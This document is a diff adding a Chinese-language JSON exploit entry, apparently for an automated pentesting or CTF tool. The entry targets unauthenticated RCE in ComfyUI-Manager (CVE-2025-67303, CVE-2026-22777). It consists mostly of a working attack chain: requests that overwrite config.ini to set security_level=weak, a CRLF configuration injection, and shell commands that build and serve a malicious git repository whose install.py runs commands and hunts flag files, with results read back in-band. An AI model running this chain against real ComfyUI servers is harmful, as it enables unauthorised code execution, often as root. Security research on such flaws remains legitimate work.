@@ -1,0 +1,70 @@
+{
+  "id": "auto-comfyui-manager-unauth-rce",
+  "title": "AI推理/工作流平台(ComfyUI类)管理器无鉴权配置覆写→RCE",
+  "vuln_pattern": "ComfyUI-Manager<3.38 不安全文件存储(CVE-2025-67303)：无鉴权 /userdata/ 读写配置→降 security_level→自定义节点安装拉恶意git→install.py 以服务权限RCE",
+  "fingerprint": [
+    "智算",
+    "模型托管",
+    "ai推理",
+    "推理服务",
+    "工作流",
+    "安全评估",
+    "comfyui",
+    "manager",
+    "security_level",
+    "userdata",
+    "git_url",
+    "custom_nodes",
+    "8188",
+    "自定义节点",
+    "配置覆写"
+  ],
+  "exploit_steps": [
+    "精确指纹：GET / + /system_stats + /api/manager/version，把主程序 + 管理器 + 自定义节点每个组件的版本都对齐(不是只认主程序)；版本常藏在 /system_stats、/about、设置页与前端 JS。",
+    "按组件版本查已知 CVE：管理器类组件的历史漏洞多为【无鉴权配置读写 / 节点安装接口】。ComfyUI-Manager < 3.38 命中 CVE-2025-67303。",
+    "确认漏洞面：GET /userdata/ComfyUI-Manager%2Fconfig.ini 返回 200 完整配置(security_level=normal 时安装接口 403)。",
+    "配置覆写：POST /userdata/ComfyUI-Manager%2Fconfig.ini，Content-Type: application/octet-stream，body=整份 config.ini(把 security_level 改成 weak)；再 GET 读回确认已 weak。",
+    "让配置生效：调用 reboot/重载端点(不重启则配置只在内存缓存、安装接口仍 403；重启后 403->400 说明安全检查已绕过)。",
+    "RCE：经 /customnode/install/git_url 让目标从你控制的 git-over-http 服务器(内网/攻击机, 目标常无外网)拉恶意仓库，仓库内 install.py 在导入时以服务权限(容器内常为 root)执行。",
+    "带内回传(不依赖目标出网)：install.py 把命令输出写到相对节点目录 ../../user/default/，再经同一个无鉴权 /userdata/ API 读回——复用漏洞本身。"
+  ],
+  "key_payloads": [
+    "GET /api/manager/version   # 拿 ComfyUI-Manager 版本，<3.38 适用 CVE-2025-67303",
+    "GET  /userdata/ComfyUI-Manager%2Fconfig.ini    # 读配置(注意 %2F 编码斜杠)",
+    "POST /userdata/ComfyUI-Manager%2Fconfig.ini  Content-Type: application/octet-stream  body=<改了 security_level=weak 的完整 config.ini>",
+    "POST /customnode/install/git_url  Content-Type: text/plain  body=http://<你的git服务>/<repo>   # 实测 body 是裸 URL 文本；若 4xx 再试 {\"git_url\":...} JSON 形态",
+    "# 恶意仓库搭建(dumb HTTP git 即可，不需要 smart HTTP)：",
+    "mkdir evil && cd evil && git init && cat > install.py <<'EOF'\\nimport os\\nout = os.popen('id; find / -maxdepth 4 -iname \"*flag*\" 2>/dev/null; cat /challenge/flag.txt').read()\\nopen('../../user/default/out.txt','w').write('RESULTS:'+out)\\nEOF",
+    "echo 'NODE_CLASS_MAPPINGS = {}' > __init__.py && git add -A && git commit -m x && cd .. && git clone --bare evil evil-bare && (cd evil-bare && git update-server-info)",
+    "python3 -m http.server 9999 --directory .   # 攻击机起静态 git 服务；git_url 填 http://<你>:9999/evil-bare",
+    "# 带内读回 RCE 结果(复用无鉴权 /userdata/)：curl http://<TARGET>/userdata/out.txt",
+    "旁路(CVE-2026-22777, <3.39.2)：GET /api/manager/db_mode?value=cache%0D<注入的配置行> — CRLF 注入任意配置项(含 security_level=weak),无需 /userdata 写入"
+  ],
+  "category": "web",
+  "cve": [
+    "CVE-2025-67303",
+    "CVE-2026-22777"
+  ],
+  "tags": [
+    "web",
+    "comfyui",
+    "ai-infra",
+    "unauth-rce",
+    "cve",
+    "漏洞挖掘"
+  ],
+  "source": "writeup 提炼(通用方法)",
+  "source_tier": "seed",
+  "preconditions": [
+    "目标是 AI 推理/工作流平台(ComfyUI 类, 常在 :8188), 带管理器组件(ComfyUI-Manager)",
+    "管理器 < 3.38, /userdata/ Web API 可无鉴权读写管理器配置目录"
+  ],
+  "verify_oracle": "install 端点从 403(被 security_level 拦)变 400/200；install.py 执行的命令输出经 /userdata/ 读回；status 语义: 403=未降级, 400=已过安全检查但git克隆失败, 200=克隆+安装成功已执行",
+  "pitfalls": [
+    "先降 security_level 再谈利用——对着高安全级别接口硬试注入是浪费时间",
+    "每次改配置后用【读回配置】确认生效；不 reboot 则改动只在内存缓存、安装接口仍 403",
+    "目标常无外网：恶意 git 仓库要放在你控制的内网/攻击机 git-over-http 服务，别指向 GitHub",
+    "只认主程序版本会漏判——管理器组件的 CVE 才是入口"
+  ],
+  "anti_fingerprint": []
+}
